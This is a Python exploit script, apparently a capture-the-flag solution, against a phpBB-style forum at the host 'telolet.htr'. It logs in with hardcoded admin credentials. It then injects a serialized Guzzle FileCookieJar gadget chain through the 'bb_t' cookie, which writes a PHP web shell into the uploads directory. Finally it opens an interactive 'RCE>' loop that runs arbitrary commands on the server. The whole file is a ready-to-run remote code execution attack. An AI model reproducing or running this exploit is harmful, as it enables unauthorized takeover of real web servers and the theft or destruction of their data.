import requests
import random
import string
import urllib.parse
import re

# Hardcoded credentials and target information
USERNAME = "admin"
PASSWORD = "T3l0lET0mBis44444!!"
HOST = "telolet.htr"
FORUM_ID = "3"

def random_string(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

DIR = f"data/uploads/{random_string(8)}.php"
url_login = f"http://{HOST}/login.php"
url_viewtopic = f"http://{HOST}/viewtopic.php?t={FORUM_ID}"
url_post = f"http://{HOST}/search.php"

# Start session
session = requests.Session()

# Login payload
login_data = {
    "login_username": USERNAME,
    "login_password": PASSWORD,
    "autologin": 1,
    "login": "Login",
}

# Attempt login
login_response = session.post(url_login, data=login_data, allow_redirects=False)
bb_data = login_response.cookies.get("bb_data")

if bb_data:
    print("[+] Login successful!")
    print(f"[+] bb_data: {bb_data}")
    
    # Generate payload
    payload = "a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A16%3A%22%3C%3F%3D%60%24_POST%5B0%5D%60%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A{}%3A%22{}%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D".format(
        len(DIR), urllib.parse.quote_plus(DIR)
    )

    print(f"[+] RCE will be at http://{HOST}/{DIR}")

    # Post data
    search_data = {
        "nm": "",
        "to": "1",
        "allw": "1",
        "pn": "",
        "f[]": "0",
        "tm": "0",
        "dm": "0",
        "o": "1",
        "s": "0",
        "submit": "\xa0\xa0Search\xa0\xa0",
    }

    # Headers
    headers = {
        "Host": f"{HOST}",
        "Cache-Control": "max-age=0",
        "Origin": f"http://{HOST}",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Referer": f"http://{HOST}/search.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": f"bb_data={bb_data}; bb_t={payload}",
        "Connection": "close",
    }
    encoded_data = "&".join([f"{key}={value}" for key, value in search_data.items()])
    headers["Content-Length"] = str(len(encoded_data))

    # Send exploit
    session.post(url_post, headers=headers, data=search_data)
    shell_response = session.get(f"http://{HOST}/{DIR}")

    if shell_response.status_code == 500:
        print("[+] Shell uploaded!")
        print("[+] Popping shell!")

        while True:
            cmd = input("RCE> ")
            if cmd == "exit":
                print("[+] Exiting!")
                break

            rce_response = session.post(f"http://{HOST}/{DIR}", data={"0": cmd}).text
            matches = re.findall(r'"Value":"([^"]*)"', rce_response)
            if matches:
                print(matches[0])
            else:
                print("[-] Error in response!")
    else:
        print("[-] Failed to upload shell.")
else:
    print("[-] Login failed!")
